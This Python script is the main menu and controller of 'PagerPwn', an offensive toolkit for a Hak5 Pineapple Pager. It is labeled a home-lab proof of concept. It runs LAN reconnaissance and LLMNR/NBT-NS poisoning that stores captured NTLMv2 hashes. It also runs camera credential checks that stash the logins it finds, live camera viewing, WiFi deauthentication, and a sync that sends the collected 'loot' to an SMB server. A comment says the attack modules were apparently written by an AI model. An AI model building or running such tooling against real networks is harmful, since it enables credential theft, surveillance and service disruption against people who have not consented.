#!/usr/bin/env python3
"""
PagerPwn v1.0 - Network recon + exploitation toolkit
Hak5 Pineapple Pager payload

Author: SLZLabs
Home lab PoC — authorized testing only.

Menu:
  RECON SWEEP      ARP scan + port fingerprint all known LAN targets
  LLMNR LISTEN     LLMNR/NBT-NS poisoner + NTLMv2 hash capture
  JETDIRECT PROBE  HP printer PJL enumeration + LCD prank
  CAMERA PROBE     Multi-manufacturer camera credential check
  CAM SNAPSHOT     Live camera view on Pager LCD
  mDNS HARVEST     Passive mDNS device catalog (zero active packets)
  WIFI SCAN        Passive 802.11 scanner (APs + client probes)
  WIFI DEAUTH      802.11 deauth attack with interactive target picker
  EXFIL LOOT       Trigger LootOverSMB sync to home server
  VIEW LOOT        Browse captured loot files on-device
  QUIET MODE       Toggle passive-only mode
  EXIT

Controls:
  A           cycle menu cursor
  B           select / execute
  Hold B      abort running module
"""

import os
import sys
import json
import time
from datetime import datetime

# ── Path setup ───────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)   # pagerctl.py + libpagerctl.so live here

from pagerctl import Pager
from ui.menu import Menu
from ui.scroll import ScrollViewer
from modules import port_scan, mdns_harvest, exfil
from modules.port_scan import classify_host

# Optional modules written by Opus (graceful degradation if not present yet)
def _try_import(name):
    try:
        mod = __import__(f"modules.{name}", fromlist=[name])
        return mod
    except ImportError:
        return None

arp_scan     = _try_import("arp_scan")
llmnr        = _try_import("llmnr")
jetdirect    = _try_import("jetdirect")
cam_probe    = _try_import("cam_probe")
cam_snap     = _try_import("cam_snap")
video_player = _try_import("video_player")
wifi_scan     = _try_import("wifi_scan")
wifi_deauth   = _try_import("wifi_deauth")

# ── Config ───────────────────────────────────────────────────────────────────
CONFIG = {
    "SUBNET":            "192.168.0",
    "IFACE":             "wlan1",
    "LOOT_DIR":          "/mmc/root/loot/pagerpwn",
    "SMB_HOST":          "",
    "SMB_SHARE":         "",
    "SMB_USER":          "",
    "SMB_PASS":          "",
    "QUIET_MODE":        False,
    "PORT_SCAN_TIMEOUT": 1.0,
    "DISCOVERED":        {},
}

# Load user config.json if present, merge into CONFIG
_config_path = os.path.join(BASE_DIR, "config.json")
if os.path.isfile(_config_path):
    try:
        with open(_config_path) as _f:
            _user_cfg = json.load(_f)
        CONFIG.update(_user_cfg)
    except Exception:
        pass  # bad JSON — fall through to defaults


def _detect_iface(iface):
    """Read IP + prefix from an interface. Returns (subnet, gateway, iface, ip) or Nones."""
    import subprocess, re

    # Try `ip` first (full path for restricted environments)
    for ip_bin in ("/sbin/ip", "/usr/sbin/ip", "ip"):
        try:
            out = subprocess.check_output(
                [ip_bin, "-4", "-o", "addr", "show", iface],
                text=True, timeout=3, stderr=subprocess.DEVNULL,
            ).strip()
            for part in out.split():
                if "/" in part:
                    ip_str, _prefix = part.split("/")
                    octets = ip_str.split(".")
                    if len(octets) == 4:
                        subnet = ".".join(octets[:3])
                        gateway = f"{subnet}.1"
                        return subnet, gateway, iface, ip_str
        except Exception:
            continue

    # Fallback: ifconfig
    try:
        out = subprocess.check_output(
            ["ifconfig", iface],
            text=True, timeout=3, stderr=subprocess.DEVNULL,
        )
        m = re.search(r"inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)", out)
        if m:
            ip_str = m.group(1)
            octets = ip_str.split(".")
            subnet = ".".join(octets[:3])
            gateway = f"{subnet}.1"
            return subnet, gateway, iface, ip_str
    except Exception:
        pass

    return None, None, iface, None


def _get_available_ifaces():
    """Return list of (iface_name, ip, subnet) for interfaces that are up with an IP."""
    available = []
    for iface in ("wlan0cli", "eth0"):
        subnet, _gw, _if, ip = _detect_iface(iface)
        if subnet and ip:
            available.append((iface, ip, subnet))
    return available


def _pick_interface(pager):
    """
    LCD interface picker. If only one iface is up, auto-selects it.
    If both are up, user picks with A (cycle) + B (select).
    Returns (subnet, gateway, iface, ip) or exits if nothing is up.
    """
    # Try a couple times in case interface is still coming up after pineapplepager stop
    ifaces = _get_available_ifaces()
    if not ifaces:
        pager.clear(Pager.BLACK)
        pager.draw_text_centered(100, "Waiting for network...", Pager.CYAN, 2)
        pager.flip()
        time.sleep(3)
        ifaces = _get_available_ifaces()

    if not ifaces:
        pager.clear(Pager.BLACK)
        pager.draw_text_centered(80, "NO NETWORK", Pager.RED, 2)
        pager.draw_text_centered(115, "wlan0cli and eth0 both down", Pager.GRAY, 1)
        pager.flip()
        pager.delay(3000)
        return None, None, None, None

    if len(ifaces) == 1:
        iface, ip, subnet = ifaces[0]
        gateway = f"{subnet}.1"
        return subnet, gateway, iface, ip

    # Two interfaces available — let the user choose
    cursor = 0
    while True:
        pager.clear(Pager.BLACK)
        pager.fill_rect(0, 0, 480, 24, Pager.rgb(180, 0, 180))
        pager.draw_text(6, 4, "SELECT INTERFACE", Pager.BLACK, 2)

        for i, (iface, ip, subnet) in enumerate(ifaces):
            y = 40 + i * 50
            label = f"{iface}: {ip}"
            sub = f"Subnet: {subnet}.0/24"
            if i == cursor:
                pager.fill_rect(0, y, 480, 46, Pager.rgb(0, 180, 180))
                pager.draw_text(12, y + 4, f"> {label}", Pager.BLACK, 2)
                pager.draw_text(24, y + 26, sub, Pager.BLACK, 1)
            else:
                pager.draw_text(12, y + 4, f"  {label}", Pager.WHITE, 2)
                pager.draw_text(24, y + 26, sub, Pager.GRAY, 1)

        pager.draw_text_centered(195, "[A] CYCLE   [B] SELECT", Pager.GRAY, 1)
        pager.flip()

        # Wait for input
        pager.clear_input_events()
        while True:
            event = pager.get_input_event()
            if not event:
                time.sleep(0.03)
                continue
            btn, etype, _ = event
            if etype != Pager.EVENT_PRESS:
                continue
            if btn == Pager.BTN_A:
                cursor = (cursor + 1) % len(ifaces)
                pager.beep(600, 25)
                break
            elif btn == Pager.BTN_B:
                pager.beep(800, 40)
                iface, ip, subnet = ifaces[cursor]
                gateway = f"{subnet}.1"
                return subnet, gateway, iface, ip

# Global menu ref — lets module callbacks trigger trophy screen
_MENU = None

# ── Helpers ───────────────────────────────────────────────────────────────────

def _ts():
    return datetime.now().strftime("%Y-%m-%d_%H%M%S")


def _save_and_trophy(filename_prefix, ext, content_str, trophy_lines):
    """Write loot and display trophy screen if we have a menu ref."""
    exfil.write_loot(
        f"{filename_prefix}_{_ts()}.{ext}",
        content_str,
        CONFIG["LOOT_DIR"],
    )
    if _MENU and trophy_lines:
        _MENU.draw_trophy(*trophy_lines[:3])


# ── Module wrappers ───────────────────────────────────────────────────────────

def run_recon_sweep(config, ui_callback, stop_event):
    """ARP sweep all hosts + port scan everything discovered."""
    results = {}

    # Phase 1: ARP sweep — find ALL live hosts on subnet
    arp_results = {}
    if arp_scan:
        ui_callback("[RECON] ARP Sweep", f"{config['SUBNET']}.0/24")
        arp_results = arp_scan.run(config, ui_callback, stop_event)
        results["arp"] = arp_results
        live = len(arp_results)
        ui_callback(f"ARP: {live} host(s) found", "Building scan list...")
        time.sleep(0.5)
    else:
        ui_callback("[RECON] Port Scan", "ARP module pending")

    if config.get("QUIET_MODE"):
        ui_callback("[QUIET MODE]", "Skipping port scan")
        time.sleep(1)
        CONFIG["_last_recon"] = results
        return results

    # Phase 2: Port scan every ARP-discovered host (generic profile for all)
    targets = {ip: ip for ip in arp_results}
    if not targets:
        ui_callback("ARP empty", "No hosts to scan")
        time.sleep(2)
        CONFIG["_last_recon"] = results
        return results

    ui_callback("[RECON] Port Scan", f"{len(targets)} host(s)")
    scan_config = dict(config)
    scan_config["TARGETS"] = targets
    scan_config["RECON_MODE"] = True
    results["ports"] = port_scan.run(scan_config, ui_callback, stop_event)

    # Build DISCOVERED map from port scan results
    discovered = {}
    for host_key, info in results.get("ports", {}).items():
        ip = info.get("ip", host_key)
        dev_type = classify_host(info.get("ports", []))
        discovered.setdefault(dev_type, []).append(ip)
    CONFIG["DISCOVERED"] = discovered

    # Save recon loot as plaintext
    total_hosts = len(arp_results)
    loot_lines = [
        "RECON SWEEP REPORT",
        "==================",
        f"Date:       {datetime.now().isoformat()}",
        f"Subnet:     {config['SUBNET']}.0/24",
        f"Hosts alive: {total_hosts}",
        "",
    ]

    # ARP results
    if arp_results:
        loot_lines.append("ARP HOSTS")
        loot_lines.append("---------")
        for ip, info in sorted(arp_results.items()):
            mac = info if isinstance(info, str) else info.get("mac", "?")
            loot_lines.append(f"  {ip:<16s} {mac}")
        loot_lines.append("")

    # Port scan results by device type
    for dev_type, ips in sorted(discovered.items()):
        if dev_type == "generic":
            continue
        loot_lines.append(f"[{dev_type.upper()}] ({len(ips)})")
        for ip in ips:
            ports_info = results.get("ports", {}).get(ip, {})
            open_ports = ports_info.get("ports", [])
            port_str = ", ".join(str(p) for p in open_ports) if open_ports else "none"
            loot_lines.append(f"  {ip:<16s} ports: {port_str}")
    generic = discovered.get("generic", [])
    if generic:
        loot_lines.append(f"[GENERIC] ({len(generic)})")
        for ip in generic:
            ports_info = results.get("ports", {}).get(ip, {})
            open_ports = ports_info.get("ports", [])
            port_str = ", ".join(str(p) for p in open_ports) if open_ports else "none"
            loot_lines.append(f"  {ip:<16s} ports: {port_str}")

    recon_ts = _ts()
    exfil.write_loot(f"recon_{recon_ts}.txt", "\n".join(loot_lines), config["LOOT_DIR"])

    # Build summary lines for scroll viewer
    summary = [
        f"Hosts alive: {total_hosts}",
        "",
    ]
    for dev_type, ips in sorted(discovered.items()):
        if dev_type == "generic":
            continue
        summary.append(f"[{dev_type.upper()}] ({len(ips)})")
        for ip in ips:
            summary.append(f"  {ip}")
    if generic:
        summary.append(f"[GENERIC] ({len(generic)})")
        for ip in generic:
            summary.append(f"  {ip}")
    summary.append("")
    summary.append(f"Saved to loot/recon_{recon_ts}.txt")

    if _MENU:
        ScrollViewer(_MENU.pager, "RECON COMPLETE", summary).run()
    else:
        ui_callback("RECON DONE", f"{total_hosts} hosts found")
        time.sleep(2)

    CONFIG["_last_recon"] = results
    return results


def run_llmnr_listen(config, ui_callback, stop_event):
    """LLMNR/NBT-NS poisoner — capture NTLMv2 hashes."""
    if config.get("QUIET_MODE"):
        ui_callback("[QUIET MODE]", "LLMNR disabled")
        time.sleep(2)
        return None

    if llmnr is None:
        ui_callback("LLMNR module", "Opus module pending")
        time.sleep(2)
        return None

    ui_callback("[LLMNR] LISTENING", "Poisoning broadcasts...")
    result = llmnr.run(config, ui_callback, stop_event)

    if result and result.get("hashes"):
        for h in result["hashes"]:
            exfil.write_loot(
                f"llmnr_{_ts()}.hash",
                h["hash_line"],
                config["LOOT_DIR"],
            )
        first = result["hashes"][0]
        _save_and_trophy(
            "llmnr", "hash",
            first["hash_line"],
            (first.get("user", "unknown"), "NTLMv2 captured", first["hash_line"][:48]),
        )

    return result


def run_jetdirect(config, ui_callback, stop_event):
    """HP printer PJL enumeration."""
    if jetdirect is None:
        ui_callback("JetDirect module", "Opus module pending")
        time.sleep(2)
        return None

    # Auto-target from recon, or fall back to config
    printers = CONFIG.get("DISCOVERED", {}).get("printer", [])
    target = printers[0] if printers else config.get("PRINTER_IP", "")
    if not target:
        ui_callback("[JETDIRECT]", "No printer found — run RECON")
        time.sleep(2)
        return None

    jd_config = dict(config)
    jd_config["TARGETS"] = {"Printer": target}
    ui_callback("[JETDIRECT]", f"Probing {target}:9100")
    result = jetdirect.run(jd_config, ui_callback, stop_event)

    if result and result.get("model"):
        _save_and_trophy(
            "printer", "txt",
            json.dumps(result, indent=2),
            (result["model"][:30], "Port 9100 open", result.get("serial", "")),
        )

    return result


def run_cam_probe(config, ui_callback, stop_event):
    """Multi-manufacturer camera HTTP/RTSP credential check."""
    if cam_probe is None:
        ui_callback("Camera module", "Opus module pending")
        time.sleep(2)
        return None

    cameras = CONFIG.get("DISCOVERED", {}).get("camera", [])
    target = cameras[0] if cameras else config.get("CAMERA_IP", "")
    if not target:
        ui_callback("[CAMERA]", "No camera found — run RECON")
        time.sleep(2)
        return None

    cam_config = dict(config)
    cam_config["TARGETS"] = {"Camera": target}
    ui_callback("[CAMERA]", f"Probing {target}...")
    result = cam_probe.run(cam_config, ui_callback, stop_event)

    if result and result.get("auth_success"):
        cred = result.get("cred", "")
        if cred and ":" in cred and cred != "none (open)":
            # Real login found — stash creds so cam_snap skips re-bruting
            u, p = cred.split(":", 1)
            CONFIG["CAM_USER"] = u
            CONFIG["CAM_PASS"] = p
            CONFIG["CAM_MFG"] = result.get("manufacturer", "generic")
            _save_and_trophy(
                "camera", "txt",
                json.dumps(result, indent=2),
                ("CAMERA AUTH OK", cred, f"{result.get('manufacturer', '').upper()} {target}"),
            )
        else:
            # RTSP open but no actual login creds — not a real capture
            CONFIG["CAM_MFG"] = result.get("manufacturer", "generic")
            ui_callback("[CAMERA]", "Unable to Login")
            ui_callback("[CAMERA]", "No Logins Found")
            time.sleep(2)

    return result


def run_cam_snap(config, ui_callback, stop_event):
    """Live camera snapshot viewer on pager LCD."""
    if cam_snap is None:
        ui_callback("CAM SNAP module", "Module not found")
        time.sleep(2)
        return None

    cameras = CONFIG.get("DISCOVERED", {}).get("camera", [])
    target = cameras[0] if cameras else config.get("CAMERA_IP", "")
    if not target:
        ui_callback("[CAM SNAP]", "No camera found — run RECON")
        time.sleep(2)
        return None

    snap_config = dict(config)
    snap_config["CAMERA_IP"] = target
    snap_config["CAM_MFG"] = CONFIG.get("CAM_MFG", "generic")
    ui_callback("[CAM SNAP]", f"Starting {target}...")
    pager_ref = _MENU.pager if _MENU else None
    result = cam_snap.run(snap_config, ui_callback, stop_event, pager=pager_ref)

    if result and result.get("frames", 0) > 0:
        _save_and_trophy(
            "cam_snap", "txt",
            json.dumps(result, indent=2),
            ("CAM SNAPSHOT", f"{result['frames']} frames", result.get("auth", "")),
        )

    return result


def run_video_player(config, ui_callback, stop_event):
    """Play PagerPwn splash animation on LCD."""
    if video_player is None:
        ui_callback("VIDEO module", "Module not found")
        time.sleep(2)
        return None

    pager_ref = _MENU.pager if _MENU else None
    return video_player.run(config, ui_callback, stop_event, pager=pager_ref)


def run_mdns_harvest(config, ui_callback, stop_event):
    """Passive mDNS device catalog."""
    duration = 30
    ui_callback("[mDNS] PASSIVE", f"Listening {duration}s...")
    result = mdns_harvest.run(config, ui_callback, stop_event, duration=duration)

    if result:
        mdns_lines = [
            "mDNS HARVEST REPORT",
            "====================",
            f"Date:       {datetime.now().isoformat()}",
            f"Duration:   {duration}s",
            f"Devices:    {len(result)}",
            "",
        ]
        for ip, names in sorted(result.items()):
            name_list = list(names) if not isinstance(names, list) else names
            mdns_lines.append(f"  {ip}")
            for name in sorted(name_list):
                mdns_lines.append(f"    - {name}")
        exfil.write_loot(
            f"mdns_{_ts()}.txt",
            "\n".join(mdns_lines),
            config["LOOT_DIR"],
        )
        ui_callback(f"mDNS: {len(result)} device(s)", "Saved to loot")
        CONFIG["_last_mdns"] = result

    time.sleep(1)
    return result


def run_wifi_scan(config, ui_callback, stop_event):
    """Passive WiFi scanner — sniffs 802.11 frames from monitor interface."""
    if wifi_scan is None:
        ui_callback("WIFI SCAN module", "Module not found")
        time.sleep(2)
        return None

    pager_ref = _MENU.pager if _MENU else None
    result = wifi_scan.run(config, ui_callback, stop_event, pager=pager_ref)

    if result and result.get("aps"):
        ap_count = len(result["aps"])
        cl_count = len(result.get("clients", {}))
        dur = result.get("duration", 0)
        if _MENU:
            _MENU.draw_trophy(
                f"{ap_count} ACCESS POINTS",
                f"{cl_count} clients probing",
                f"Scanned {dur}s",
            )

    return result


def run_wifi_deauth(config, ui_callback, stop_event):
    """WiFi deauthentication attack — scan, pick target, blast deauth frames."""
    if wifi_deauth is None:
        ui_callback("WIFI DEAUTH module", "Module not found")
        time.sleep(2)
        return None

    pager_ref = _MENU.pager if _MENU else None
    result = wifi_deauth.run(config, ui_callback, stop_event, pager=pager_ref)

    if result and result.get("packets_sent") and _MENU:
        pkts = result["packets_sent"]
        dur = result.get("duration", 0)
        ssid = result.get("target_ssid") or result.get("target_bssid", "?")
        client = result.get("target_client") or "ALL"
        p = _MENU.pager
        p.clear(Pager.BLACK)
        p.fill_rect(0, 0, 480, 22, Pager.rgb(180, 0, 0))
        p.draw_text(6, 3, "DEAUTH COMPLETE", Pager.WHITE, 2)
        p.draw_text_centered(40, ssid[:24], Pager.CYAN, 2)
        p.draw_text_centered(70, f"{pkts} packets sent", Pager.WHITE, 2)
        p.draw_text_centered(100, f"Client: {client[:17]}", Pager.YELLOW, 2)
        p.draw_text_centered(130, f"Duration: {dur}s", Pager.GRAY, 2)
        p.draw_text_centered(175, "[A] CONTINUE", Pager.GREEN, 2)
        p.flip()
        p.beep(600, 80)
        p.beep(400, 120)
        p.clear_input_events()
        while True:
            event = p.get_input_event()
            if event:
                btn, etype, _ = event
                if btn == Pager.BTN_A and etype == Pager.EVENT_PRESS:
                    break
            time.sleep(0.03)

    return result


def run_exfil(config, ui_callback, stop_event):
    """Trigger LootOverSMB sync."""
    exfil.run(config, ui_callback, stop_event)
    time.sleep(1)


def run_view_loot(config, ui_callback, stop_event):
    """Browse captured loot files on-device."""
    lines = []
    loot_dir = config["LOOT_DIR"]
    for fname in exfil.list_loot_files(loot_dir):
        lines.append(f"=== {fname} ===")
        try:
            with open(os.path.join(loot_dir, fname)) as f:
                for line in f.readlines()[:15]:
                    lines.append("  " + line.rstrip())
        except Exception:
            lines.append("  (unreadable)")
    if not lines:
        lines = ["No loot captured yet.", "", "Run RECON SWEEP or", "LLMNR LISTEN first."]
    if _MENU:
        ScrollViewer(_MENU.pager, "LOOT FILES", lines).run()


# ── Splash ────────────────────────────────────────────────────────────────────

def _splash(p):
    """Animated splash — plays the PPV video intro, falls back to static."""
    if video_player:
        result = video_player.run(
            {}, lambda *a: None, None, pager=p,
        )
        if result and result.get("frames_played", 0) > 0:
            return
    # Fallback if video missing or module not loaded
    p.clear(Pager.BLACK)
    p.draw_text_centered(40, "PAGERPWN", Pager.MAGENTA, 4)
    p.draw_text_centered(105, "v1.0", Pager.CYAN, 3)
    p.draw_text_centered(150, "SLZLabs", Pager.GRAY, 2)
    p.flip()
    p.beep(880, 80)
    p.beep(1108, 80)
    p.beep(1320, 120)
    p.delay(2000)


def _show_selected_iface(p):
    """Brief confirmation screen after interface is picked."""
    iface = CONFIG.get("IFACE", "?")
    our_ip = CONFIG.get("OUR_IP", "?")
    subnet = CONFIG.get("SUBNET", "?")
    p.clear(Pager.BLACK)
    p.draw_text_centered(60, f"{iface}", Pager.GREEN, 2)
    p.draw_text_centered(90, f"IP: {our_ip}", Pager.WHITE, 2)
    p.draw_text_centered(120, f"Scanning: {subnet}.0/24", Pager.CYAN, 2)
    p.flip()
    p.delay(1500)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    global _MENU

    os.makedirs(CONFIG["LOOT_DIR"], exist_ok=True)

    with Pager() as p:
        p.set_rotation(270)
        p.set_brightness(80)

        _splash(p)

        # Interface picker
        subnet, gw, iface, ip = _pick_interface(p)
        if not subnet:
            return  # no network — bail
        CONFIG["SUBNET"] = subnet
        CONFIG["GATEWAY"] = gw
        CONFIG["IFACE"] = iface
        CONFIG["OUR_IP"] = ip

        _show_selected_iface(p)

        items = [
            ("RECON SWEEP",         run_recon_sweep),
            ("LLMNR LISTEN",        run_llmnr_listen),
            ("JETDIRECT PROBE",     run_jetdirect),
            ("CAMERA PROBE",        run_cam_probe),
            ("CAM SNAPSHOT",        run_cam_snap),
            ("mDNS HARVEST",        run_mdns_harvest),
            ("WIFI SCAN",           run_wifi_scan),
            ("WIFI DEAUTH",         run_wifi_deauth),
            ("EXFIL LOOT",          run_exfil),
            ("VIEW LOOT",           run_view_loot),
            ("QUIET MODE [OFF]",    None),
            ("EXIT",                None),
        ]

        menu = Menu(p, "PAGERPWN", items)
        _MENU = menu

        menu.run(CONFIG)

        p.clear(Pager.BLACK)
        p.flip()


if __name__ == "__main__":
    main()
